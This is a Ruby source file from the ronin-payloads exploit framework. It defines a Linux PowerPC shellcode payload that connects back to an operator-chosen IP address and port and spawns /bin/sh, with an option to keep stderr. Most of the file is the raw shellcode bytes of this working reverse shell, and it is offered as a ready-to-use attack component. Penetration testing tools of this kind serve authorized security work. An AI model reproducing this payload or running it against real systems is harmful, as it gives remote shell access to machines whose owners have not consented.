# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2024 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/reverse_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module PPC
          #
          # Linux PPC shellcode that spawns a connect back reverse shell.
          #
          class ReverseShell < ReverseShellPayload

            register 'shellcode/linux/ppc/reverse_shell'

            arch :ppc
            os :linux

            author 'Charles Stevenson', email: 'core@bokeoa.com'

            summary 'Linux PPC reverse shell shellcode'
            description <<~DESC
              Linux PPC shellcode that spawns a connect back reverse shell.

              Note: disabling with_stderr will save 16 bytes, but lose stderr.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-87.html"
            ]

            param :with_stderr, Boolean, default: true,
                                         desc:    'Enables/disables stderr'

            #
            # Builds the shellcode.
            #
            def build
              sin_addr_hi = packed_ipv4[0,2]
              sin_addr_lo = packed_ipv4[2,2]

              @payload = "\x7c\x3f\x0b\x78" \
                         "\x3b\x40\x01\x0e" \
                         "\x3b\x5a\xfe\xf4" \
                         "\x7f\x43\xd3\x78" \
                         "\x3b\x60\x01\x0d" \
                         "\x3b\x7b\xfe\xf4" \
                         "\x7f\x64\xdb\x78" \
                         "\x7c\xa5\x2a\x78" \
                         "\x7c\x3c\x0b\x78" \
                         "\x3b\x9c\x01\x0c" \
                         "\x90\x7c\xff\x08" \
                         "\x90\x9c\xff\x0c" \
                         "\x90\xbc\xff\x10" \
                         "\x7f\x63\xdb\x78" \
                         "\x3b\xdf\x01\x0c" \
                         "\x38\x9e\xff\x08" \
                         "\x3b\x20\x01\x98" \
                         "\x7f\x20\x16\x70" \
                         "\x44\xde\xad\xf2" \
                         "\x7c\x78\x1b\x78" \
                         "\xb3\x5e\xff\x16" \
                         "\x7f\xbd\xea\x78" \
                         "\x63\xbd#{packed_port}" \
                         "\xb3\xbe\xff\x18" \
                         "\x3f\xa0#{sin_addr_hi}" \
                         "\x63\xbd#{sin_addr_lo}" \
                         "\x93\xbe\xff\x1a" \
                         "\x93\x1c\xff\x08" \
                         "\x3a\xde\xff\x16" \
                         "\x92\xdc\xff\x0c" \
                         "\x3b\xa0\x01\x1c" \
                         "\x38\xbd\xfe\xf4" \
                         "\x90\xbc\xff\x10" \
                         "\x7f\x20\x16\x70" \
                         "\x7c\x7a\xda\x14" \
                         "\x38\x9c\xff\x08" \
                         "\x44\xde\xad\xf2" \
                         "\x7f\x03\xc3\x78" \
                         "\x7c\x84\x22\x78" \
                         "\x3a\xe0\x01\xf8" \
                         "\x7e\xe0\x1e\x70" \
                         "\x44\xde\xad\xf2" \
                         "\x7f\x03\xc3\x78" \
                         "\x7f\x64\xdb\x78" \
                         "\x7e\xe0\x1e\x70" \
                         "\x44\xde\xad\xf2".b

              if params[:with_stderr]
                @payload += "\x7f\x03\xc3\x78" \
                            "\x7f\x44\xd3\x78" \
                            "\x7e\xe0\x1e\x70" \
                            "\x44\xde\xad\xf2".b
              end

              @payload += "\x7c\xa5\x2a\x79" \
                          "\x42\x40\xff\x35" \
                          "\x7f\x08\x02\xa6" \
                          "\x3b\x18\x01\x34" \
                          "\x98\xb8\xfe\xfb" \
                          "\x38\x78\xfe\xf4" \
                          "\x90\x61\xff\xf8" \
                          "\x38\x81\xff\xf8" \
                          "\x90\xa1\xff\xfc" \
                          "\x3b\xc0\x01\x60" \
                          "\x7f\xc0\x2e\x70" \
                          "\x44\xde\xad\xf2" \
                          "/bin/shZ".b
            end

          end
        end
      end
    end
  end
end
